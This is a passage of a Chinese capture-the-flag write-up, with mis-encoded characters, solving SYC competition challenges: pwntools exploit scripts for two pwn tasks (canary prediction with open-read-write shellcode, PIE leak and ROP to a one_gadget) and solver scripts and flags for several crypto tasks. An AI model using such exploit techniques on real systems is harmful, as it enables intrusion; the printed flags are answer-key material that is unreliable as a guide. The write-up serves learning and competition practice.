å¾…è¡¥å……ï¼‰</p><p>â€‹</p><h3 id="white-canary"><a href="#white-canary" class="headerlink" title="white_canary"></a>white_canary</h3><blockquote><p>è¿œç¨‹ä¹‹å‰è®°å¾—â€œsudo ntpdate cn.pool.ntp.orgâ€ åŒæ­¥ä¸‹æ—¶é—´</p></blockquote><p><code>init()</code> è‡ªå·±å®ç°äº†canaryè®¡ç®—æ–¹æ³•ï¼Œç¦ç”¨äº†59ï¼Œæ— æ³• <code>execve</code>ã€‚</p><p>ä¼ªéšæœºæ•°ç®—canary+å†™orwçš„shellcode+ret2shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed=libc.time(<span class="number">0</span>)%<span class="number">60</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v2 = libc.rand()</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">canary = (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>) \</span><br><span class="line">  + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">  </span><br><span class="line">canary&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">someplace=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>))</span><br><span class="line">pl+=asm(shellcraft.read(<span class="number">3</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">pl+=asm(shellcraft.write(<span class="number">1</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">buf=<span class="number">0x4040E0</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(buf)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ez-fullprotection"><a href="#ez-fullprotection" class="headerlink" title="ez_fullprotection"></a>ez_fullprotection</h3><p>scanfæ³„éœ²_startåœ°å€ç»•PIEï¼Œçº¿ç¨‹æº¢å‡ºTLSè¦†ç›–canaryã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30161</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ez_fullprotection&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;entered &#x27;</span>)</span><br><span class="line">_start=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">base=_start - elf.sym._start</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">puts_plt=base+elf.plt.puts</span><br><span class="line">puts_got=base+elf.got.puts</span><br><span class="line">pop_rdi=base+<span class="number">0x16e3</span></span><br><span class="line">ret=base+<span class="number">0x101a</span></span><br><span class="line">ret_addr=base+<span class="number">0x1541</span></span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line">pl=pl.ljust(<span class="number">0x870</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">ogg=[<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">ogg=[libc_base+k <span class="keyword">for</span> k <span class="keyword">in</span> ogg]</span><br><span class="line"></span><br><span class="line">pop_4=base+<span class="number">0x16dc</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_4)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(ogg[<span class="number">0</span>])</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><blockquote><p>Biboâ€¦Hello! ä½ å¥½! ã“ã‚“ã«ã¡ã¯! ĞŸÑ€Ğ¸Ğ²ĞµÑ‚! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7dâ€¦ Hmmâ€¦ Something goes wrong with my grettings bot.</p></blockquote><p>16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼š<code>SYC&#123;Hello_World_Crypto_bibobibo&#125;</code>ã€‚</p><p>â€‹</p><h3 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof_of_work"></a>proof_of_work</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:5526 Build your own function to solve proof_of_work!</p></blockquote><p>PoWä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;59.110.20.54&#x27;</span>,<span class="number">5526</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;XXXX+&#x27;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;== &#x27;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;XXXX: &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;st3p_1nt0_1nter4ctive_Crypt0graphy&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="SimpleRSA"><a href="#SimpleRSA" class="headerlink" title="SimpleRSA"></a>SimpleRSA</h3><blockquote><p>So simple RSA! Waitâ€¦ Are you kidding me? <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RSA_(cryptosystem">https://en.wikipedia.org/wiki/RSA_(cryptosystem</a>) hint: flag&lt;p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">35</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">n = p*q </span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(p) </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line"><span class="comment">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br></pre></td></tr></table></figure></blockquote><p>$d = e^{-1} \bmod p,\;\;\; m = c^d \bmod p$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line">c = <span class="number">510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;Just_a_s1mple_modular_equation&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h3><blockquote><p>I invented a new symmetric cryptosystem, and I believe you will never break it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># step0: key generation &amp; distribution</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s0</span>(<span class="params">msg</span>): </span><br><span class="line">    k1,k2 = [urandom(<span class="built_in">len</span>(msg)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> k1,k2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: Alice encrypt M, and send it to Bob</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: Bob encrypt c1, and send it to Alice </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> c2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: Alice decrypt c2, and send it to Bob.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s3</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: Bob decrypt c3, get M.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s4</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg,k1,k2</span>): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">assert</span> msg == m_</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s what hacker Eve got:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_</span>(<span class="params">msg,k1,k2</span>):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">if</span> HACK == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(c1) </span><br><span class="line">        <span class="built_in">print</span>(c2) </span><br><span class="line">        <span class="built_in">print</span>(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line"><span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>æ¨å¯¼æœ‰ $m = c_1 \oplus c_2 \oplus c_3$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line">c3 = <span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"></span><br><span class="line">m = strxor(strxor(c1,c2),c3)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;I_l0v3_Crypt0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h3><blockquote><p>An old algorithm but widely used nowadays.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+os.urandom(padlen-<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">p = [getPrime(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)] </span><br><span class="line">c = [bytes_to_long(flag)%i <span class="keyword">for</span> i <span class="keyword">in</span> p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span></span><br><span class="line"><span class="string">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>CRTç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c = [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, <span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line">m = crt(c,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\x9c\xf9C/\xfc\xb8t\x16&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h3><blockquote><p>éå¸¸å¥½å¥—å¨ƒï¼Œä½¿æˆ‘çš„å¤å…¸æ—‹è½¬</p></blockquote><p>æ¯ä¸€å±‚è§£å‡ºçš„å­—ç¬¦ä¸²ä¸ºä¸‹ä¸€å±‚zipå‹ç¼©åŒ…å¯†ç ã€‚</p><p>ç¬¬1å±‚ï¼š<code>udzeojxuwqcu</code>ï¼ŒROT10ï¼Œå¾—ï¼š<code>enjoythegame</code></p><p>ç¬¬2å±‚ï¼š<code>ialhhooavtepcyr</code>ï¼Œæ …æ 7ï¼Œå¾—ï¼š<code>ilovecryptohaha</code></p><p>ç¬¬3å±‚ï¼š<code>5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</code>ï¼Œbase64ï¼Œå¾—ï¼š<code>å®‡å®™ä¸‡æ³•çš„é‚£ä¸ªæºå¤´</code></p><p>ç¬¬4å±‚ï¼š<code>ç†Šæ›°ï¼šå‘‹é£Ÿé£Ÿé£Ÿå–å™—å±±ç¬¨ç¬¨ç ´å—„å’¯å“ˆå‹•å—¡é›œé¡å—’å˜¿å•½æ²’æ­¡ç ´å–å’¬æˆ‘å•½å¯¶ç›œå™”å’¯æ²’</code>ï¼Œç†Šæ›°è§£å¯†ï¼Œå¾—ï¼š<code>never gonna give you up</code></p><p>ç¬¬5å±‚ï¼š<code>password: adltlfltqrcy</code>ï¼Œ<code>key: ğŸ‘ğŸ‘˜ğŸ‘ ğŸ‘©ğŸ‘ğŸ‘˜ğŸ‘¤ğŸ‘œ</code>ï¼Œ</p><p>å…ˆbase100ï¼Œå¾—ï¼škey=<code>fairgame</code>ï¼Œå†playfairï¼Œå¾—ï¼š<code>genshinstart</code></p><p>flagï¼š<code>SYC&#123;classical_1s_fun&#125;</code></p><p>â€‹</p><h3 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h3><blockquote><p>Harder RSA. Check it out!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ 